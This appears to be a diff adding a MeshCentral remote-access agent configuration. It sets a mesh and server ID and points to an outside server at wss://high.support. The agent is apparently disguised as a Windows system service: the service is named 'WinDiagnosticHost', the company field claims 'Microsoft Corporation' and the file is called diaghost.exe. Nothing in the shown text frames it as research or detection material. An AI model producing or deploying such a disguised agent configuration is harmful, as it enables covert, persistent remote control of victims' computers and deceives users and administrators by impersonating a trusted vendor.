@@ -1,0 +1,10 @@
+MeshName=Office
+MeshType=2
+MeshID=0X3E8BF04DF88041C3E38DB5FD9CCF2A0EA9D5850D84F8689D8A623DD309B415BC197345BF231E2C91CEAB98AC75EEB521
+ServerID=7BA6D82B02C2EF153CD5552118EA4C55A68A46E9273B4494E693262D2C94C258886B1D1F0883F52E7A5491A154B836BA
+MeshServer=wss://high.support:443/agent.ashx
+meshServiceName=WinDiagnosticHost
+displayName=Windows Diagnostic Host Service
+companyName=Microsoft Corporation
+description=system health monitoring
+fileName=diaghost.exe
